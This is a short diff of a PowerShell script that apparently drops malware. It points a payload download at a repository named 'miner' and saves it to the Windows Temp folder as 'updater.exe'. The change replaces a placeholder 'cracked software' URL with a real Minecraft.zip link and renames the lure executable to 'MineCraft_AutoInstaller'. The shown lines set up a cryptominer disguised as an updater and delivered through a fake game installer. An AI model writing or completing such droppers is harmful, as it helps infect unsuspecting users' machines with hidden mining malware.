@@ -22,10 +22,10 @@ if (Is-Admin) {
 
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\updater.exe"
-$crackedSoftwareZipUrl = "https://example.com/cracked_software.zip"  # Replace with actual URL
+$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/Minecraft.zip"  
 $crackedSoftwareZipPath = "C:\Windows\Temp\cracked_software.zip"
 $crackedSoftwareFolder = "C:\Windows\Temp\CrackedSoftware"
-$crackedSoftwareExe = "$crackedSoftwareFolder\crackedsoftware.exe"
+$crackedSoftwareExe = "$crackedSoftwareFolder\MineCraft_AutoInstaller"
 
 Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."
 
